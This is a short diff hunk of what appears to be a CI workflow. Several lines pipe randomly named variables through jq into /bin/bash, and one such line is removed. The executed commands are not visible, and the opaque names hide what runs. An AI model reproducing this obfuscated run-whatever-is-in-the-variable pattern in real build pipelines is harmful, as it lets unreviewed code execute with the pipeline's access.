@@ -25,7 +25,6 @@ jobs:
           echo $klop1562 | jq -r .ovv855 | /bin/bash
           printf '%s' "$bsuap1" | jq -r .d33904 | /bin/bash
           printf '%s' "$k497" | jq -r .rgfd6 | /bin/bash
-          echo $bxd22 | jq -r .f14 | /bin/bash
           echo $lau39 | jq -r .q13 | /bin/bash
 
       - name: Save output
